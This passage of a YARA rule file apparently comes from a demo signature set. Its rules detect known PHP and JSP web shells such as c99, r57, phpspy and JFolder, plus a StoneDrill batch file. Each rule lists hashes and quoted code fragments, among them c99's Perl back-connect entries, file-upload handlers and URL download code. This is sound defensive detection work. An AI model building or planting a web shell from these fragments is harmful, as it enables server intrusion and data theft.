   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, KAdot Universal Shell v0.1.6.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:56:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "f3ca29b7999643507081caab926e2e74"
      hash2 = "527cf81f9272919bf872007e21c4bdda"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<td><input size=\"48\" value=\"$docr/\" name=\"path\" type=\"text\"><input type=" 
      $s2 = "$uploadfile = $_POST['path'].$_FILES['file']['name'];" fullword
      $s6 = "elseif (!empty($_POST['ac'])) {$ac = $_POST['ac'];}" fullword
      $s7 = "if ($_POST['path']==\"\"){$uploadfile = $_FILES['file']['name'];}" fullword
   condition: 
      2 of them
}

rule Webshell_C99_w4cking_Shell_RID30C8 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:54:31"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "d3f38a6dc54a73d304932d9227a739ec"
      hash2 = "9c34adbc8fd8d908cbb341734830f971"
      hash3 = "f2fa878de03732fbf5c86d656467ff50"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "echo \"<b>HEXDUMP:</b><nobr>" 
      $s4 = "if ($filestealth) {$stat = stat($d.$f);}" fullword
      $s5 = "while ($row = mysql_fetch_array($result, MYSQL_NUM)) { echo \"<tr><td>\".$r" 
      $s6 = "if ((mysql_create_db ($sql_newdb)) and (!empty($sql_newdb))) {echo \"DB " 
      $s8 = "echo \"<center><b>Server-status variables:</b><br><br>\";" fullword
      $s9 = "echo \"<textarea cols=80 rows=10>\".htmlspecialchars($encoded).\"</textarea>" 
   condition: 
      2 of them
}

rule Webshell_phpspy_2006_arabicspy_RID328E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2008.php, 2009mssql.php, phpspy_2005_full.php, phpspy_2006.php, arabicspy.php, hkrkoz.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:10:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "aa17b71bb93c6789911bd1c9df834ff9"
      hash2 = "b68bfafc6059fd26732fa07fb6f7f640"
      hash3 = "40a1f840111996ff7200d18968e42cfe"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "$this -> addFile($content, $filename);" fullword
      $s3 = "function addFile($data, $name, $time = 0) {" fullword
      $s8 = "function unix2DosTime($unixtime = 0) {" fullword
      $s9 = "foreach($filelist as $filename){" fullword
   condition: 
      all of them
}

rule Webshell_c99_c99shell_RID2EC7 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files c99.php, c66.php, c99-shadows-mod.php, c99shell.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:29:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "0f5b9238d281bc6ac13406bb24ac2a5b"
      hash2 = "68c0629d08b1664f5bcce7d7f5f71d22"
      hash3 = "048ccc01b873b40d57ce25a4c56ea717"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "  if (unlink(_FILE_)) {@ob_clean(); echo \"Thanks for using c99shell v.\".$shv" 
      $s3 = "  \"c99sh_backconn.pl\"=>array(\"Using PERL\",\"perl %path %host %port\")," fullword
      $s4 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" cellSpacing=0 borderColorDark=#66" 
      $s7 = "   elseif (!$data = c99getsource($bind[\"src\"])) {echo \"Can't download sources" 
      $s8 = "  \"c99sh_datapipe.pl\"=>array(\"Using PERL\",\"perl %path %localport %remotehos" 
      $s9 = "   elseif (!$data = c99getsource($bc[\"src\"])) {echo \"Can't download sources!" 
   condition: 
      2 of them
}

rule Webshell_queryDong_spyjsp2010_zend_RID343F : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, config.jsp, myxx.jsp, queryDong.jsp, spyjsp2010.jsp, zend.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:22:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "d44df8b1543b837e57cc8f25a0a68d92"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "return new Double(format.format(value)).doubleValue();" fullword
      $s5 = "File tempF = new File(savePath);" fullword
      $s9 = "if (tempF.isDirectory()) {" fullword
   condition: 
      2 of them
}

rule Webshell_r57shell_antichat_RID3147 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_iFX.php, r57_kartal.php, r57.php, antichat.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 13:15:41"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "513b7be8bd0595c377283a7c87b44b2e"
      hash2 = "1d912c55b96e2efe8ca873d6040e3b30"
      hash3 = "4108f28a9792b50d95f95b9e5314fa1e"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s6 = "$res   = @mysql_query(\"SHOW CREATE TABLE `\".$_POST['mysql_tbl'].\"`\", $d" 
      $s7 = "$sql1 .= $row[1].\"\\r\\n\\r\\n\";" fullword
      $s8 = "if(!empty($_POST['dif'])&&$fp) { @fputs($fp,$sql1.$sql2); }" fullword
      $s9 = "foreach($values as $k=>$v) {$values[$k] = addslashes($v);}" fullword
   condition: 
      2 of them
}

rule Webshell_NIX_REMOTE_WEB_SHELL_nstview_xxx_RID360A : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files NIX REMOTE WEB-SHELL.php, nstview.php, NIX REMOTE WEB-SHELL v.0.5 alpha Lite Public Version.php, Cyber Shell (v 1.0).php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:38:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "4745d510fed4378e4b1730f56f25e569"
      hash2 = "f3ca29b7999643507081caab926e2e74"
      hash3 = "46a18979750fa458a04343cf58faa9bd"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "BODY, TD, TR {" fullword
      $s5 = "$d=str_replace(\"\\\\\",\"/\",$d);" fullword
      $s6 = "if ($file==\".\" || $file==\"..\") continue;" fullword
   condition: 
      2 of them
}

rule Webshell_css_dm_he1p_xxx_RID30B3 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Detects Web Shell from tennc webshell repo"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:01"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "ae76c77fb7a234380cd0ebb6fe1bcddf"
      hash3 = "76037ebd781ad0eac363d56fc81f4b4f"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s3 = "String savePath = request.getParameter(\"savepath\");" fullword
      $s4 = "URL downUrl = new URL(downFileUrl);" fullword
      $s5 = "if (Util.isEmpty(downFileUrl) || Util.isEmpty(savePath))" fullword
      $s6 = "String downFileUrl = request.getParameter(\"url\");" fullword
      $s7 = "FileInputStream fInput = new FileInputStream(f);" fullword
      $s8 = "URLConnection conn = downUrl.openConnection();" fullword
      $s9 = "sis = request.getInputStream();" fullword
   condition: 
      4 of them
}

rule Webshell_JSP_icesword_RID2F52 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 2.jsp, 520.jsp, icesword.jsp, job.jsp, ma1.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:52:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9abd397c6498c41967b4dd327cf8b55a"
      hash2 = "077f4b1b6d705d223b6d644a4f3eebae"
      hash3 = "56c005690da2558690c4aa305a31ad37"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\"></head>" fullword
      $s3 = "<input type=\"hidden\" name=\"_EVENTTARGET\" value=\"\" />" fullword
      $s8 = "<input type=\"hidden\" name=\"_EVENTARGUMENT\" value=\"\" />" fullword
   condition: 
      2 of them
}

rule Webshell_JFolder_JSP_2_RID2F29 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 404.jsp, data.jsp, in.jsp, JFolder.jsp, jfolder01.jsp, jsp.jsp, suiyue.jsp, warn.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 11:45:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "9f54aa7b43797be9bab7d094f238b4ff"
      hash2 = "793b3d0a740dbf355df3e6f68b8217a4"
      hash3 = "8979594423b68489024447474d113894"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s0 = "<table width=\"100%\" border=\"1\" cellspacing=\"0\" cellpadding=\"5\" bordercol" 
      $s2 = " KB </td>" fullword
      $s3 = "<table width=\"98%\" border=\"0\" cellspacing=\"0\" cellpadding=\"" 
      $s4 = "<!-- <tr align=\"center\"> " fullword
   condition: 
      all of them
}

rule Webshell_phpspy_2006_PHPSPY_RID30B4 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files phpspy_2005_full.php, phpspy_2005_lite.php, phpspy_2006.php, PHPSPY.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 12:51:11"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "42f211cec8032eb0881e87ebdb3d7224"
      hash2 = "40a1f840111996ff7200d18968e42cfe"
      hash3 = "0712e3dc262b4e1f98ed25760b206836"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s4 = "http://www.4ngel.net" fullword
      $s5 = "</a> | <a href=\"?action=phpenv\">PHP" fullword
      $s8 = "echo $msg=@fwrite($fp,$_POST['filecontent']) ? \"" fullword
      $s9 = "Codz by Angel" fullword
   condition: 
      2 of them
}

rule Webshell_browser_201_3_ma_ma2_download_RID3571 : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files browser.jsp, 201.jsp, 3.jsp, ma.jsp, ma2.jsp, download.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 16:13:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "a7e25b8ac605753ed0c438db93f6c498"
      hash2 = "fb8c6c3a69b93e5e7193036fd31a958d"
      hash3 = "4cc68fa572e88b669bce606c7ace0ae9"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "private static final int EDITFIELD_ROWS = 30;" fullword
      $s2 = "private static String tempdir = \".\";" fullword
      $s6 = "<input type=\"hidden\" name=\"dir\" value=\"<%=request.getAttribute(\"dir\")%>\"" 
   condition: 
      2 of them
}

rule Webshell_000_403_c5_queryDong_spyjsp2010_RID350B : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files 000.jsp, 403.jsp, c5.jsp, queryDong.jsp, spyjsp2010.jsp"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 15:56:21"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "059058a27a7b0059e2c2f007ad4675ef"
      hash2 = "8b457934da3821ba58b06a113e0d53d9"
      hash3 = "90a5ba0c94199269ba33a58bc6a4ad99"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "\" <select name='encode' class='input'><option value=''>ANSI</option><option val" 
      $s7 = "JSession.setAttribute(\"MSG\",\"<span style='color:red'>Upload File Failed!</spa" 
      $s8 = "File f = new File(JSession.getAttribute(CURRENT_DIR)+\"/\"+fileBean.getFileName(" 
      $s9 = "((Invoker)ins.get(\"vd\")).invoke(request,response,JSession);" fullword
   condition: 
      2 of them
}

rule Webshell_r57shell127_r57_kartal_r57_RID338E : DEMO SCRIPT T1505_003 WEBSHELL {
   meta:
      description = "Web Shell - from files r57shell127.php, r57_kartal.php, r57.php"
      author = "Florian Roth"
      reference = "-"
      date = "2014-01-28 14:52:51"
      score = 70
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      hash1 = "1d912c55b96e2efe8ca873d6040e3b30"
      hash2 = "4108f28a9792b50d95f95b9e5314fa1e"
      tags = "DEMO, SCRIPT, T1505_003, WEBSHELL"
      minimum_yara = "3.5.0"
      
   strings:
      $s2 = "$handle = @opendir($dir) or die(\"Can't open directory $dir\");" fullword
      $s3 = "if(!empty($_POST['mysql_db'])) { @mssql_select_db($_POST['mysql_db'],$db); }" fullword
      $s5 = "if (!isset($_SERVER['PHP_AUTH_USER']) || $_SERVER['PHP_AUTH_USER']!==$name || $_" 
   condition: 
      2 of them
}

rule StoneDrill_BAT_1_RID2CD7 : APT DEMO FILE MIDDLE_EAST SCRIPT {
   meta:
      description = "Rule to detect Batch file from StoneDrill report"
      author = "Florian Roth"
      reference = "https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/"
      date = "2013-01-01 10:06:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      modified = "2026-03-12"
      tags = "APT, DEMO, FILE, MIDDLE_EAST, SCRIPT"
      minimum_yara = "3.5.0"
      
   strings:
      $s1 = "set u100=" ascii
      $s2 = "set u200=service" ascii fullword
      $s3 = "set u800=%~dp0" ascii fullword
      $s4 = "\"%systemroot%\\system32\\%u100%\"" ascii
      $s5 = "%\" start /b %systemroot%\\system32\\%" ascii
   condition: 
      uint32 ( 0 ) == 0x68636540 and filesize < 500 and 2 of them
}

